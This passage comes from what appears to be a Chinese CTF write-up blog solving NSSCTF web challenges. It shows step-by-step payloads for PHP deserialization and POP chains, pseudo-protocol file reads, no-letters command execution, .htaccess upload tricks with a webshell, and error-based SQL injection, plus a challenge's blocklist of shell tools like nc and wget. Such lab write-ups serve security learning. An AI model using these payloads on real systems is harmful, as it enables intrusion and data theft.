class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;wllm&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No wake up&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Letmeseesee</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$Letmeseesee</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>和前面那题easy serialize一样，本地写个php代码生成满足条件的序列化字符串然后用GET上传<br>但是这里有一个__wakeup()魔法函数，当对象被反序列化时，__wakeup() 方法会被自动调用。<br>这里的$this -&gt; passwd会被sha1加密。但是sha1加密不可逆，我们不想让wakeup这个函数执行。<br><mark>当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup (); </mark><br>利用代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HaHaHa</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; passwd = <span class="string">&quot;wllm&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;HaHaHa&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们把参数个数<code>2</code>改成和实际不符，比如1，用GET传入，得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?p</span>=<span class="symbol">O:</span><span class="number">6</span><span class="symbol">:<span class="string">&quot;HaHaHa&quot;</span></span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">6</span><span class="symbol">:<span class="string">&quot;passwd&quot;</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;wllm&quot;</span></span>;&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h1><p>题目<br><img src="https://pic1.imgdb.cn/item/67af3304d0e0a243d4ff4430.png"><br>看到题目我们获得两个信息，1. 要找到hint.php 2.url里面自带了?wllm&#x3D;<br>题目是<code>PseudoProtocols</code>(伪协议)，我们用php伪协议读一下hint.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?wllm=php:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># echo PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4= | base64 -d</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>
<p>所以去读&#x2F;test2222222222222.php<br><img src="https://pic1.imgdb.cn/item/67af360ad0e0a243d4ff45f0.png"><br>这里要用get请求传入参数a，然后判断a的值是不是”I want flag”<br>这里了解一下，<code>file_get_contents()</code> 是 PHP 读取文件内容的函数，data:&#x2F;&#x2F; 伪协议允许在 URL 直接存储数据，而不需要实际文件，<code>php://input</code> 执行 POST 数据中的 php 代码。<br>所以这题利用data伪协议或者php:&#x2F;&#x2F;input存储数据，然后程序读取判断<br>php:&#x2F;&#x2F;input<br><img src="https://pic1.imgdb.cn/item/67af38c8d0e0a243d4ff47de.png"><br>data:&#x2F;&#x2F;</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//n</span>ode7.anna.nssctf.cn:<span class="number">22738</span>//test2222222222222.php?a=data:<span class="regexp">//</span>text/plain,I<span class="variable">%2</span>0want<span class="variable">%20flag</span></span><br></pre></td></tr></table></figure></div>
<h1 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure></div>
<p>这里字母和一堆符号都被过滤了，索面只能用数字，而<code>/</code> <code>~</code>也没有过滤，所以我们考虑用url编码,然后url编码取反，取反之后的字符基本都是不可见字符，所以可以绕过字母<br>url在字符前加<code>~</code>就是取反</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>得到~&#96;system<code>=%8C%86%8C%8B%9A%92     ~</code>ls &#x2F;&#96;&#x3D;%93%8C%DF%D0<br>然后在url传入参数的时候，再取反回去就可以了(记得加分号)</p>
<p><img src="https://pic1.imgdb.cn/item/67af3dd7d0e0a243d4ff4a18.png"><br>~ <code>cat fl*</code>&#x3D;%9C%9E%8B%DF%D0%99%93%D5<br>然后继续取反执行就得到flag</p>
<h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure></div>
<p>这个表示file参数如果前三个是php就包含这个文件<br>所以用php伪协议查看文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:29953/?file=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Nice!!!TlNTQ1RGe2NjZjg2ODBlLWViZGItNGIxZC1iNzFjLTY2ZDYxNjI5YjhhMH0K</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGe2NjZjg2ODBlLWViZGItNGIxZC1iNzFjLTY2ZDYxNjI5YjhhMH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;ccf8680e-ebdb-4b1d-b71c-66d61629b8a0&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h1><p>题目和之前的upload，也是 传一个一句话木马的php改成的1.jpg<br>但是改包后缀改成php这里就不行了，但是可以发现这个是一个apache的服务<br><img src="https://pic1.imgdb.cn/item/67af5b6cd0e0a243d4ff588c.png"><br>这里学习了要上传<code>.htaccess </code>文件<br>.htaccess 是一个纯文本文件，它里面存放着 Apache 服务器配置相关的指令。<br>.htaccess 主要的作用有：URL 重写、自定义错误页面、MIME 类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义 404 错误页面、阻止 &#x2F; 允许特定 IP&#x2F;IP 段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。<br>.htaccess 的用途范围主要针对当前目录。<br>然后写一个.htaccess文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>上传这个文件之后，这个目录下的jpg文件就会被解析成php文件<br>因为我们刚才已经上传了一句话木马的jpg，现在用蚁剑连接就能找到flag<br><img src="https://pic1.imgdb.cn/item/67af5dafd0e0a243d4ff58fb.png"></p>
<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p><img src="https://pic1.imgdb.cn/item/67b002b5d0e0a243d4ff80fd.png"><br>输入一个值之后会跳转到<code>http://node7.anna.nssctf.cn:28229/index.php?id=-1</code>而且有回显</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">id：1&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<p>这里通过报错信息，判断为字符型注入<br>然后尝试<code>--+</code>和<code>#</code>得出这里用的注释符是<code>#</code><br>1.判断列数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">id：<span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">没有提示...........</span><br><span class="line"></span><br><span class="line">id：<span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Unknown column &#x27;<span class="number">4</span>&#x27; <span class="keyword">in</span> &#x27;<span class="keyword">order</span> <span class="title">clause</span>&#x27;</span><br></pre></td></tr></table></figure></div>
<p>2.爆库名<br>这里要根据报错信息来的出库名，学习一个知识点：<br><code>extractvalue (1,concat (0x7e,database ()))</code><br>EXTRACTVALUE() 是 MySQL 的一个 XML 处理函数，它用于从 XML 数据中提取特定的值.但如果传入 非 XML 结构 的 XPath，会报错，并在错误信息中泄露数据.CONCAT() 用于拼接字符串。0x7e 是 十六进制的 ~（波浪号）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>：<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;~test_db&#x27;</span><br></pre></td></tr></table></figure></div>
<p>得到库名test_db。<br>2.爆表<br>只要让报错信息里面爆出表名就可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>’ <span class="keyword">and</span> <span class="number">1</span>=extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id：<span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~test_tb,users&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>得到表名test_tb,users<br>3.爆列名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;test_tb&#x27;</span>)))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,flag&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>4.查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>：-<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">0</span>x7e,(select group_concat(flag) from test_tb)) #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;&#123;ace8876e-<span class="number">87</span>f9-<span class="number">4526</span>-<span class="number">862</span>a-ff5d963&#x27;</span><br></pre></td></tr></table></figure></div>
<p>但是这里默认只返回了32个字符，我们用substring得到完整</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">extractvalue</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">substring</span>(<span class="built_in">group_concat</span>(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line">id：<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">extractvalue</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">substring</span>(<span class="built_in">group_concat</span>(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: &#x27;a-ff5d9638a322&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>可以拼接出完整flag<code>NSSCTF&#123;ace8876e-87f9-4526-862a-ff5d9638a322&#125;</code></p>
<p>这题可以学习判断注入类型，报错如何注入，extractvalue函数，substring绕过输出限制</p>
<h1 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这题考查的是反序列化链<br>这里并没有直接执行w44m中的内容，并且这里的admin 和 passwd 是内部的，不能被更改，需要借助w22m 和  w33m来执行w44m中的Getflag这个函数<br>首先w22m是入口，这里执行destruct  接着跳到w33m因为w00m <mark>被echo了，就是被当作字符串使用</mark> 所以会调用toString  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line"># <span class="function"><span class="title">w22m</span>.__destruct().w00m-&gt;</span><span class="function"><span class="title">w33m</span>.__toString().w00m-&gt;</span>w44m.Getflag()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    protected $passwd = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new w22m();</span><br><span class="line">$b = new w33m();</span><br><span class="line">$c = new w44m();</span><br><span class="line"></span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line">$b -&gt; w22m = <span class="string">&#x27;Getflag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b01013d0e0a243d4ff8737.png"><br>这里先新建三个类，$a传入$b，表示执行destruct的时候就执行$b类里面的内容，<br>然后$b-&gt;w00m&#x3D;$c 表示先调用$c类中的内容，让他执行Getflag 这个函数<br>这题里面最后要用<mark>urlencode</mark></p>
<h1 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see 